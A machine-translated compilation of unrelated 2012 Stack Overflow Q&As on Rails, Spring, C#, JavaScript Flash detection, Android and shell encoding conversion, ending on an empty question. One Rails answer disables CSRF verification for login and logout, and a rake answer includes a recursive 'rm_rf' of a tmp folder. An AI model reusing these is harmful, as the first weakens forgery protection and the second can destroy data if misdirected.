问候克里斯托弗

# ruby-on-rails - Rails - 会话无法通过 AJAX 登录？

> ID：12866042
> 
> 赞同：2
> 
> 时间：2012-10-12T19:45:42.110
> 
> 标签：ruby-on-rails, ajax, session

我有一个 Rails 应用程序，它使用静态 html 页面（不在 app/views/ 中）向 Rails 服务器发送 AJAX 请求以进行登录和注销。

我使用会话进行用户身份验证，当用户登录时，`session[:userid]`已设置并将响应“登录”发送回静态 html 页面。但是，当我单击注销按钮登录后，我发现`session[:userid]`变成了`nil`.

这是我的代码：

对于登录：

```
 def login
    # code here
    if encrypt(params[:password]) == @user.password # authenticated
      session[:userid] = @user.id
      render :text => 'logged in'
    else # wrong password
      render :text => 'password not correct'
    end
  end 
```

用于注销

```
 def logout
    # here session is no longer available  
    session[:userid] = nil  
    render :text => 'logged out'
  end 
```

登录页面：

```
 <button id='login_button'>Log in</button>
    <script type="text/javascript" charset="utf-8">
        $('#login_button').click(function() {
            $.ajax({
                type: 'POST',
                url: 'http://localhost:3000/user/login',
                data: { username : $('#login_username').val() , password : $('#login_password').val() }
            }).done(function(data) {
                if (data == 'logged in') {
                    window.location = 'logged_in.html';
                } else {
                    alert(data);
                }
            });
        });
    </script> 
```

对于注销：

```
<button id='logout_button'>Log out</button>
<script type="text/javascript" charset="utf-8">
    $('#logout_button').click(function() {
        $.ajax({
            type: 'POST',
            url: 'http://localhost:3000/user/logout',
        }).done(function(data) {
            console.log(data);
        });
    });
</script> 
```

登录日志：

```
Started POST "/user/login" for 127.0.0.1 at 2012-10-12 16:28:46 -0500
Processing by UserController#login as */*
  Parameters: {"username"=>"name", "password"=>"[FILTERED]"}
  User Load (0.1ms)  SELECT "users".* FROM "users" WHERE (username = 'name')
Completed 200 OK in 12ms (Views: 0.3ms | ActiveRecord: 0.6ms) 
```

注销日志：

```
Started POST "/user/logout" for 127.0.0.1 at 2012-10-12 16:28:50 -0500
Processing by UserController#logout as */*
{} <--------------------------------------- here I printed out session
  Rendered text template (0.0ms)
Completed 200 OK in 1ms (Views: 0.7ms | ActiveRecord: 0.0ms) 
```

是不是 AJAX 的问题，我们不能使用 session 来处理来自客户端的 AJAX 请求？

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:01:09.653

您是否设置了“protect_from_forgery”？如果是这样，这就是导致问题的原因。当 Rails 收到 Ajax 调用并没有找到正确的 CSRF 令牌时，它将关闭会话。

与其在全局范围内关闭保护，不如在相关控制器中放置类似这样的内容，仅针对来自静态页面的任何调用将其关闭：

```
skip_before_filter :verify_authenticity_token, :only => [:login, :logout] 
```

# php - Society6 嵌入图片和链接

> ID：12866046
> 
> 赞同：3
> 
> 时间：2012-10-12T19:45:54.727
> 
> 标签：php, jquery

我正在尝试将我的 social6 商店中的图像提取到 PHP 页面中。目前我正在使用 Society 6 提供的以下代码，它似乎只提取一个图像。

谁能指出我正确的方向，以使用 Javascript 或理想情况下使用 PHP 的链接来拉出所有图像，以便我可以嵌入它们

```
<script type="text/javascript"><!--
s6_user = "ThriftandThistle";
s6_format = "300x250";
//--></script>
<script type="text/> 
```

[http://society6.com/js/show_banner.js](http://society6.com/js/show_banner.js)

# asp.net-mvc - 实体框架 + MVC 4 + Knockout.js AddView 模板？

> ID：12866049
> 
> 赞同：3
> 
> 时间：2012-10-12T19:46:16.273
> 
> 标签：asp.net-mvc, entity-framework, knockout.js, asp.net-mvc-4, t4

最近我一直在搞砸 knockout.js，它似乎有很多希望。但是，我似乎找不到任何好的代码模板（又名 t4 模板或 .tt 文件）。

我的猜测是，我们需要的唯一更改是在视图端，而不是控制器端，但我也愿意查看新的控制器模板。

我现在在哪里：

*   创建一个新的 MVC 4 项目
*   使用NuGet，安装实体框架5、jquery、jquery ui、knout
*   通过使用 Entity Framework 对现有数据库进行逆向工程来创建 .edmx 模型
*   将 C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\ItemTemplates\CSharp\Web\MVC 4\CodeTemplates 从资源管理器拖到项目的根目录中
*   删除 CodeTemplates\AddController
*   突出显示 CodeTemplates\AddView\CSHTML 中的所有项目，并在属性中将“自定义工具”中的文本空白，以防止它们构建
*   开始使用 Create.tt 和 Edit.tt 添加淘汰代码。

目标预期输入：右键单击 > 添加控制器 ... > 使用 EF 的 MVC 控制器

目标 预期结果：使用 EF 创建的控制器和视图已经有了淘汰代码。

如果您使用类似于您更喜欢的淘汰赛的东西，我很想听听！

另外，是否有必要使用像 MVCScaffolding 这样的插件？似乎您可以自定义现有模板并获得相同的结果。

谢谢你的时间！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T19:54:25.067

我会走 MVCScaffolding 路线。每当您希望添加控制器时，您都可以创建自己的自定义脚手架脚本，也就是说，只要您可以忍受 PowerShell。

# java - Spring：没有找到符合自动装配条件的匹配 bean

> ID：12866050
> 
> 赞同：0
> 
> 时间：2012-10-12T19:46:31.703
> 
> 标签：java, spring

Application-Context 设置正确！

这是我的课堂场景

```
public interface IManager
{
 public void doStuff();
}

@Component
public abstract class ManagerAction implements IManager
{
  @Async
  @Override
  public void doStuff()
  {
     //doing stuff
  }

  public abstract manageWorker();
}

@Component
public class Working extends ManagerAction
{
  @Override
  public manageWorker()
  {
    //some busy code
  }
}

@Component
public class NotWorking extends ManagerAction
{
  @Override
  public manageWorker()
  {
    //some busy code
  }
}

@Service
public class BusinessWorker
{
  @Autowire
  private IManager manager_;

  public void preformTasks()
  {    
    manager_.doStuff();
  }
} 
```

**这是我的错误**

```
ERROR [main] (ContextLoader.java:307) - Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'BusinessWorker': Injection of autowired dependencies failed; nested exception is org.springframework.beans.factory.B
eanCreationException: Could not autowire field: private com.background.IManager com.background.BusinessWorker.manager_; nested exception is org.springframework.beans.
factory.NoSuchBeanDefinitionException: No matching bean of type [com.background.IManager] found for dependency: expected at least 1 bean which qualifies as autowire candidate for
 this dependency. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}

Caused by: org.springframework.beans.factory.BeanCreationException: Could not autowire field: private com.background.IManager com.background.BusinessWorker.manager_; 
nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No matching bean of type [com.background.IManager] found for dependency: expected at least 1 
bean which qualifies as autowire candidate for this dependency. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}
    at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:506)
    at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:87)
    at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:284)
    ... 28 more 
```

应用上下文

```
<mvc:annotation-driven />
<task:annotation-driven />
<context:annotation-config />
<context:component-scan base-package="com.background" /> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T21:15:48.057

错误消息说明了一切：您尝试自动装配 IManager 的一个实例，但是两个不同的 Spring 组件实现了这个接口，所以 Spring 不知道要自动装配哪一个。您需要[使用 @Qualifier 注解](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/htmlsingle/spring-framework-reference.html#beans-autowired-annotation-qualifiers)来指定您希望 Spring 自动装配哪一个。

# rake - 未初始化的常量 Rake::Pipeline::ManifestEntry::DateTime

> ID：12866054
> 
> 赞同：2
> 
> 时间：2012-10-12T19:46:46.820
> 
> 标签：rake, asset-pipeline

我不是一个 ruby​​ 人，我正在使用 Ember.js 开发一个项目，我正在使用 Rake 管道来编译我的脚本。

```
# AssetFile
$: << 'lib'

require 'rake-pipeline-web-filters'    

output BUILD
input SRC_DIR do
  match '**/*.handlebars' do
    handlebars :precompile => true
    concat 'templates.js'
  end

  match '**/*.coffee' do
    coffee_script
  end
end

output JS_DIR
input BUILD_DIR do
  match '*.js' do
    concat 'app.js'
  end
end 
```

当我第一次在控制台上执行 rakep 时工作正常，但第二次出现`const_missing`错误

```
c:/Ruby193/lib/ruby/1.9.1/rake/ext/module.rb:36:in `const_missing': uninitialized constant Rake::Pipeline::ManifestEntry::DateTime (NameError)
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/manifest_entry.rb:9:in `from_hash'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/manifest.rb:24:in `block in read_manifest'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/manifest.rb:23:in `each'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/manifest.rb:23:in `read_manifest'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/project.rb:225:in `last_manifest'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:219:in `create_file_task'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:197:in `block (2 levels) in generate_rake_tasks'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:196:in `each'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:196:in `block in generate_rake_tasks'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:194:in `each'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:194:in `map'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/filter.rb:194:in `generate_rake_tasks'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline.rb:410:in `block in generate_rake_tasks'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline.rb:407:in `each'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline.rb:407:in `generate_rake_tasks'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline.rb:333:in `setup'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline.rb:308:in `block in invoke'
        from <internal:prelude>:10:in `synchronize'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline.rb:305:in `invoke'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/project.rb:111:in `each'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/project.rb:111:in `block in invoke'
        from <internal:prelude>:10:in `synchronize'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/project.rb:110:in `invoke'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/lib/rake-pipeline/cli.rb:19:in `build'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/thor-0.16.0/lib/thor/task.rb:27:in `run'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/thor-0.16.0/lib/thor/invocation.rb:120:in `invoke_task'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/thor-0.16.0/lib/thor.rb:275:in `dispatch'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/thor-0.16.0/lib/thor/base.rb:425:in `start'
        from c:/Ruby193/lib/ruby/gems/1.9.1/gems/rake-pipeline-0.7.0/bin/rakep:4:in `<top (required)>'
        from c:/Ruby193/bin/rakep:23:in `load'
        from c:/Ruby193/bin/rakep:23:in `<main>' 
```

当我手动删除文件或让时间过去时，rakep 命令工作正常

**注意**：我也无法对要连接的文件进行排序

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:27:56.927

我刚刚遇到了同样的问题。我正在使用 rake-pipeline 来缩小静态站点的样式表。

这里发生的是 rake-pipeline 正在尝试使用`DateTime`该类解析日期时间，但由于您不是在处理 Ruby 项目，因此该类不可用。我猜是因为 rake-pipeline 主要用于 Ruby 项目，所以当时没有人注意到这是一个问题。我可以看到[这个问题已经在 master 分支上修复了](https://github.com/livingsocial/rake-pipeline/commit/26b512cdaa79008b30d35e986b1a4555236717d6#L1L9)，但是新的 gem 版本还没有发布。

同时，您可以将以下代码添加到您的 Assetfile（在您的输入和输出之前），这将在您的过滤器运行之前删除 tmp 目录。这只是一个临时修复，因为这意味着您的输入每次都会被过滤，无论它们是否已更改，但它确实不需要任何狡猾的日期时间解析。

```
require 'fileutils'
FileUtils.rm_rf 'tmp' 
```

*小心`rm_rf`！确保它指向您的 tmp 目录，而不是别的。*

回复：对你的文件进行排序，我不知道你的问题的细节，但你可能会发现[这个例子](https://github.com/livingsocial/rake-pipeline/blob/master/examples/modifying_pipelines.md)很有帮助。

# php - 禁用对用户评论的多次投票

> ID：12866057
> 
> 赞同：2
> 
> 时间：2012-10-12T19:47:06.613
> 
> 标签：php, javascript, mysql

**描述：**

我正在为我构建的 Web 应用程序创建评论/回复功能。我有一个帖子，我也想链接这些评论。为了减少垃圾邮件并鼓励社区参与，我想对每个评论/回复实施投票系统。

**问题：**

我知道如何设置数据库，也知道如何显示赞成票/反对票。我唯一不知道该怎么做就是保持投票......即使用户刷新页面也投票。我不希望用户能够在单个帖子上多次投票。类似于此网站上的投票，它会跟踪您已经投了黄色的赞成票。

我想到的：

*   将 post id 放在 cookie 中，并附加 user_id。对 cookie 的简单检查可以阻止用户再次投票
*   在 table post id 中放置一个唯一约束......但这是我感到困惑的地方。我应该为投票的帖子设置一个单独的表格吗？数据库模式的想法（我认为）在这里：[https ://stackoverflow.com/a/12350981/185672](https://stackoverflow.com/a/12350981/185672)
*   将所有 id 保存在会话数组中并检查所有投票的 id ......但这会变得很大。
*   结合 cookie 和数据库来减少 db 调用的次数。

未来，单个用户可能会投出 1000 多张选票。

编辑：

我发现将结果存储在数据库中是必须的。如果用户在不拨打 1000 次电话的情况下拥有有效的投票权限，我如何检查每条回复/评论？

**资源：**

帮助解决了一些进一步的垃圾邮件问题，但没有回答最初的问题： [https ://stackoverflow.com/a/2333085/185672](https://stackoverflow.com/a/2333085/185672)

解释如何计算选票但不保持“upvote”检查的旧解决方案。 [http://www.9lessons.info/2009/08/vote-with-jquery-ajax-and-php.html](http://www.9lessons.info/2009/08/vote-with-jquery-ajax-and-php.html)

**奖金问题：**

如果你们知道一个很棒的脚本可以让我将评论系统（带投票）同步到我已经构建的应用程序中？

另外，我试图找到重复项，但我就是找不到。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:26:19.310

是的，只需保留一个单独的表格来跟踪用户投票。由于您知道哪个用户在请求该页面，因此您可以轻松加入投票表以确定当前用户是否有资格对页面上的每个帖子进行投票。对于每篇文章，如果符合条件，则输出一个版本的 html，如果不符合条件，则输出另一个版本。

一旦 ajax 请求请求进行投票的 php 文件，您就可以再次检查该用户是否有资格投票 - 即他们正在更改投票，或者他们之前没有投票。

以 yahoo 的新闻故事为例 - 当您请求一个您已发表评论的页面时，您自己的评论会禁用投票按钮。通过在浏览器的开发工具中对页面进行一些黑客攻击，您可以启用这些按钮。您甚至可以点击它们并为您自己的帖子投票——尽管只有一次。

因此，您可以看到他们获得了 2/3 的正确率，并根据用户的投票资格输出 html。他们还防止多次投票（服务器端），他们只是不进行服务器端检查以确保您没有为自己的评论投票。

另一方面，Stack Overflow 总是显示相同的 html - 但是当您单击为自己的评论投票时，服务器端代码对这个想法犹豫不决，并且响应基本上是 'bugger-off！你不能这样做'已经收到来自服务器的否定结果，页面上的 javascript 会弹出消息，而不是更新投票计数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:03:54.207

我建议您在页面中创建一个“隐藏字段”，以存储有关用户赞成/反对票的信息。这是你将如何使用它：

如果用户赞成/反对，则显示赞成票的 javsvscript 将字段设置为可能为 true 以指示投票状态，并且还会向服务器发送 AJAX 请求，服务器将在用户配置文件中记录投票状态数据库。

然后，每当为特定用户重新加载帖子时，服务器将隐藏字段服务器端设置为 true 或 false，具体取决于存储在数据库中的投票记录。JS 将在加载时检查隐藏字段并相应地在页面上设置投票（您可能需要一个额外的隐藏字段来指示它是赞成票还是反对票）。

# javascript - 使用 Javascript 检测 Pepper (PPAPI) Flash

> ID：12866060
> 
> 赞同：4
> 
> 时间：2012-10-12T19:47:10.920
> 
> 标签：javascript, flash, google-chrome, ppapi

我们正在使用专有的文档查看器，它与某些 Chrome 中的 Pepper 版本的 Flash 播放效果不太好，所以我希望能够检测到它并重定向到不同格式的相同内容。

由于这个版本似乎落后于 NPAPI 版本，我一直在使用[FlashDetect](http://www.featureblend.com/javascript-flash-detection-library.html)来查找版本号，但这需要每天更新。我宁愿不看 UserAgent，因为它是导致问题的 Flash 架构而不是浏览器，但是有什么方法可以用 Javascript 做到这一点吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-12T20:07:09.317

我认为应该这样做：

```
var isPPAPI = false;
var type = 'application/x-shockwave-flash';
var mimeTypes = navigator.mimeTypes;

if (mimeTypes && mimeTypes[type] && mimeTypes[type].enabledPlugin &&
    mimeTypes[type].enabledPlugin.filename == 'pepflashplayer.dll') isPPAPI = true; 
```

**[jsFiddle](http://jsfiddle.net/XSFxb/)**上的演示。

* * *

*UPD №1：不确定是否需要，但我写了一点解释：*

如果我们的浏览器有一个 MIME 类型枚举，我们可以得到一个与指定类型关联的插件。所以我们得到了与之关联的插件，`'application/x-shockwave-flash'`并检查它的文件名是否为`'pepflashplayer.dll'`. 我认为这个名字是不变的，以后不会改变。

* * *

*UPD №2：*

要在 Google Chrome 中启用/禁用 PPAPI，您应该转到此页面：`chrome://plugins/`

（对不起，这个网址需要直接粘贴到地址栏中。）

* * *

*UPD №3：*

我做了一些调查，发现了一篇有趣的[文章](http://support.google.com/chrome/bin/answer.py?hl=en&answer=108086)，它帮助我实现了一个跨平台的解决方案。我认为这段代码应该适用于所有操作系统：

```
var isPPAPI = false;
var type = 'application/x-shockwave-flash';
var mimeTypes = navigator.mimeTypes;

var endsWith = function(str, suffix) {
    return str.indexOf(suffix, str.length - suffix.length) !== -1;
}

if (mimeTypes && mimeTypes[type] && mimeTypes[type].enabledPlugin &&
   (mimeTypes[type].enabledPlugin.filename == "pepflashplayer.dll" ||
    mimeTypes[type].enabledPlugin.filename == "libpepflashplayer.so" ||
    endsWith(mimeTypes[type].enabledPlugin.filename, "Chrome.plugin"))) isPPAPI = true; 
```

查看更新的**[小提琴](http://jsfiddle.net/XSFxb/2/)**。

* * *

*UPD №4：*

稍微更改了代码以满足当今的现实。现在条件如下所示：

```
if (mimeTypes && mimeTypes[type] && mimeTypes[type].enabledPlugin &&
   (mimeTypes[type].enabledPlugin.filename.match(/pepflashplayer|Pepper/gi))) isPPAPI = true; 
```

退房`**[jsFiddle](http://jsfiddle.net/Crystall/c9o15azw/)**`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-30T02:30:11.833

不需要 Underscore.js 的 Darren 支票版本

```
var checkForPepper = function() {
if (navigator.plugins) {
    for (var i=0, count = navigator.plugins.length; i < count; i++) {
        var filename = navigator.plugins[i].filename;
        if (filename === 'pepflashplayer.dll' || filename === 'PepperFlashPlayer.plugin') return true;
    }
}
return false; 
```

}

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-24T01:28:55.623

我无法让其他示例正常工作，但以下代码适用于我在启用或禁用 Chrome PPAPI 的 Mac 和 PC 上。在其他浏览器上也可以正常工作。

```
function checkForPepper() {
  return navigator.plugins && _.any(navigator.plugins, function(plugin) {
    return plugin.filename === 'pepflashplayer.dll' || plugin.filename === 'PepperFlashPlayer.plugin';
  });
}
alert ('Pepper enabled: '+ checkForPepper()); 
```

注意：需要 underscore.js。[在这里](http://jsfiddle.net/gUA8U/)拉小提琴。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-06T20:59:30.243

我使用正则表达式制作了这个方法的更简洁的版本。包括测试。

[http://jsfiddle.net/YNCVh/](http://jsfiddle.net/YNCVh/)

>>> 目前正在运行 Pepper？真的

>>> 测试用例插件匹配？pepflashplayer.dll：是的

>>> 测试用例插件匹配？PepperFlashPlayer.plugin：真

>>> 测试用例插件匹配？libpepflashplayer.so：真

```
/**
 * Regular expression to test for pepper PPAPI plugins
 */
var PPAPI_REGEX = /^(lib)?pep(per)?flashplayer/i;

/**
 * Returns true if the current agent is running PPAPI version of flash
 */
function runningPepperFlash() {
  if (navigator.plugins) {
    for (var i = 0, count = navigator.plugins.length; i < count; i++) {
      var plugin = navigator.plugins[i].filename;
      var has_pepper = PPAPI_REGEX.test(plugin);
      if (has_pepper) {
        return true;
      }
    }
    return false;
  }
}

// ----------------------------------------------------------
// test cases:

/**
 * Test case against the three (3) known plugin file types (win,mac,linux)
 */
function executeTestCases() {
  var plugins = ['pepflashplayer.dll', 'PepperFlashPlayer.plugin', 'libpepflashplayer.so'];
  for (var i = 0; i < plugins.length; i++) {
    var has_pepper = PPAPI_REGEX.test(plugins[i]);
    console.log('Test Case Plugin Matched? ', plugins[i], ': ', has_pepper);
  }

}

console.log('Currently Running Pepper?', runningPepperFlash());

executeTestCases();​ 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-05-21T16:36:28.883

我知道您要求使用 Javascript，但这也可以*（更容易）*在 Flash 中完成。只需检查

```
if (Capabilities.manufacturer === "Google Pepper") {
    Alert.show("Using PPAPI");
} 
```

[资源](http://labs.stackandheap.com/detecting-pepper-based-flash-player/)

# c# - 将返回值分配给 .NET 中的引用类型

> ID：12866063
> 
> 赞同：0
> 
> 时间：2012-10-12T19:47:27.397
> 
> 标签：c#, .net

如果您在 .NET 中创建一个类，它将是一个引用类型。在本例中，我在 SomeMethod 中设置 MyClass 的名称。现在在 Main 方法中，我真的不需要从 SomeMethod 分配返回值，因为传入的参数是引用类型。我希望 main 方法中的实例具有新的更新名称“John”，并且确实如此。

为了便于阅读，我经常将返回值分配回，即使在 main 中不需要将更新的属性重新分配给我的原始实例。我的假设是编译器足够聪明，不会在 Main 方法中重新创建 MyClass 的新引用。真的吗？或者编译器在为自己分配返回值时是否真的创建了一个新的引用并指向更新的值？

```
//My class will be a reference type
public class MyClass 
{
    public int ID { get; set; }
    public string name { get; set; }
}

public class Main
{
    //Main method of application
    public void Main()
    {
        MyClass myClass = new MyClass();
        //return value back to itself
        myClass = SomeMethod(myClass);
    }

    public MyClass SomeMethod(MyClass myClass)
    {
        myClass.name = "John";
        return myClass;
    }
} 
```

这是IL

```
 instance void Main1 () cil managed 
{
    // Method begins at RVA 0x207c
    // Code size 15 (0xf)
    .maxstack 2
    .locals init (
        [0] class Test.MyClass myClass
    )

    IL_0000: newobj instance void Test.MyClass::.ctor()
    IL_0005: stloc.0
    IL_0006: ldarg.0
    IL_0007: ldloc.0
    IL_0008: call instance class Test.MyClass Test.Main::SomeMethod(class Test.MyClass)
    IL_000d: stloc.0
    IL_000e: ret
} // end of method Main::Main1 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T19:49:33.337

It doesn't create a new reference.

But there isn't any point in returning it either. This should suffice:

```
 public void SomeMethod(MyClass myClass)
 {
    myClass.name = "John";

 } 
```

The above is natural and actually less convoluted than the way you propose.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T19:49:23.650

Classes are passed as reference to methods, so your are modifying the same thing as you are returning.

> When an object based on a reference type is passed to a method, no copy of the object is made. Instead, a reference to the object being used as a method argument is made and passed. Changes made through this reference will therefore be reflected in the calling method.
> 
> Source: [http://msdn.microsoft.com/en-us/library/ms173114(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms173114(v=vs.80).aspx)

Regarding the readability: your method should always be self-explanatory. The name of the method should in my opinion say something about what it does.

```
void AddClientContextToContainer(Container destination) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:03:35.317

在您的情况下，您正在创建对象的一个*​​实例*。实际实例是通过`new`. 引用本质上只是一个整数（32 位系统上的 32 位，64 位系统上的 64 位）。该整数是指对象实例在内存中的位置。“创建一个新的引用”本质上与创建一个新整数的工作量相同（意思是非常非常少；它是计算机可以做的最小可能的工作单元）。

与替代方案相反，您的代码`void`将执行两个（冗余）引用副本。（一次将方法参数复制到堆栈上的返回值，然后再次从该返回值返回到原始变量。）

实际的额外工作量是微不足道的。它存在，但它真的很小。这里的关注点应该只是可读性之一。如果您发现该代码更易于阅读和理解，那很好。请注意，这是一种通常仅在`MyClass`不可变时使用的模式，其中返回值是对新实例的引用，而不是传入的实例。这可能会导致其他人阅读您的代码时感到困惑。如果他们错误地假设对象是不可变的，它可能会导致……坏事。

其他人建议让方法返回 void，但我想说让类变得不可变可能才有意义。您已经在遵循更不可变的模式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-12T20:16:17.237

要回答您的问题，是的，编译器足够聪明，不会将返回值重新分配给同一个对象。如果我们使用 Reflector 或 dotPeek 打开您的代码，您的代码：

```
public void Main()
{
    MyClass myClass = new MyClass();
    //return value back to itself
    myClass = SomeMethod(myClass);
} 
```

只是转换为：

```
public void Main()
{
    this.SomeMethod(new MyClass());
} 
```

即使我们对 reassign 变量做一些事情，它仍然会被编译器删除。例如，编译器将其转换为：

```
public void Main()
{
    MyClass myClass = new MyClass();
    //return value back to itself
    myClass = SomeMethod(myClass);

    Console.WriteLine(myClass.name);
} 
```

对此：

```
public void Main()
{
    Console.WriteLine(this.SomeMethod(new MyClass()).name);
} 
```

但就像 Lews Therin 和 Robert Jeppesen 所说，你不应该这样做，因为这是不好的做法，可能会导致误解

# android - android listview 在 setItemChecked 上被反转

> ID：12866066
> 
> 赞同：1
> 
> 时间：2012-10-12T19:47:37.537
> 
> 标签：android, android-listview

似乎在一个非常奇怪的问题中，当我将项目标记为已检查时，列表视图的顺序会颠倒

```
listview.setItemChecked() 
```

开发人员文档中没有与此相关的文档。我很感激任何帮助。

这是检查项目部分的代码

```
CheckBox box = (CheckBox) convertView.findViewById(R.id.select);
box.setOnClickListener(new OnClickListener() {
    public void onClick(View view) {
        CheckBox checkBox = (CheckBox) view;
        list.setItemChecked(position + list.getHeaderViewsCount(), checkBox.isChecked());

        final long[] checkedItemIds = list.getCheckedItemIds();
        Log.d(Constants.TAG,
                "HomeActivity.onCreate(...).new EMListAdapter() {...}.getView(...).new OnClickListener() {...}.onClick: " + Arrays.toString(checkedItemIds));
        if (checkedItemIds.length > 0) {
            if (mMode == null) {
                mMode = startActionMode(new EashmartActionBar(HomeActivity.this) {
                    public boolean onCreateActionMode(ActionMode mode, Menu menu) {
                        menu.add(R.string.delete).setIcon(R.drawable.bin).setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);
                        return true;
                    }

                    public boolean onActionItemClicked(ActionMode mode, MenuItem item) {
                        switch (item.getItemId()) {
                        case 0:
                            Log.d(Constants.TAG,
                                    "HomeActivity.onCreate(...).new EMListAdapter() {...}.getView(...).new OnClickListener() {...}.onClick(...).new EashmartActionBar() {...}.onActionItemClicked: "
                                            + Arrays.toString(checkedItemIds));
                            invoiceManager.delete(checkedItemIds);
                            break;
                        }
                        mode.finish();
                        mMode = null;
                        return true;
                    }

                    public void onDestroyActionMode(ActionMode mode) {
                        for (int i = 0; i < list.getCount(); i++) {
                            list.setItemChecked(i, false);
                        }
                        mMode = null;
                    }
                });
            }
        } else {
            if (mMode != null) {
                mMode.finish();
                mMode = null;
            }
        }
    }
}); 
```

这个问题似乎只发生在 2.3 而不是 4.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-22T05:50:22.500

不要直接从列表中删除元素。
首先从 ArrayAdapter 的 ArrayList 中移除元素。
比使用新的 ArrayList 值重新创建/刷新列表视图。

# linux - 查找文本文件的编码

> ID：12866068
> 
> 赞同：2
> 
> 时间：2012-10-12T19:47:43.920
> 
> 标签：linux, file, bash, text, encoding

我有一堆不同编码的文本文件。但我想将所有的转换成 utf-8。由于大约有 1000 个文件，我无法手动完成。我知道 llinux 中有一些命令可以将文件的编码从一种编码更改为另一种编码。但我的问题是如何自动检测文件的当前编码？显然我正在寻找一个命令（比如 FindEncoding($File) ）来做到这一点：

```
foreach file
do
$encoding=FindEncoding($File);
uconv -f $encoding -t utf-8 $file;
done 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T22:54:32.787

我通常这样做：

```
for f in *.txt; do
    encoding=$(file -i "$f" | sed "s/.*charset=\(.*\)$/\1/")
    recode $encoding..utf-8 "$f"
done 
```

请注意，重新编码将覆盖文件以更改字符编码。如果无法通过扩展名识别文本文件，则可以使用 确定它们各自的 mime 类型`file -bi | cut -d ';' -f 1`。

通过首先检查 UFT-8 来避免不必要的重新编码可能也是一个好主意：

```
if [ ! "$encoding" = "utf-8" ]; then
    #encode 
```

经过这种处理后，可能仍然有一些带有`us-ascii`编码的文件。原因是 ASCII 是 UTF-8 的一个子集，除非引入任何 ASCII 无法表达的字符，否则它仍然在使用。在这种情况下，编码切换为 UTF-8。

# asp.net-mvc - 关于 MVC 3 中的模式

> ID：12866069
> 
> 赞同：1
> 
> 时间：2012-10-12T19:47:47.957
> 
> 标签：asp.net-mvc, design-patterns

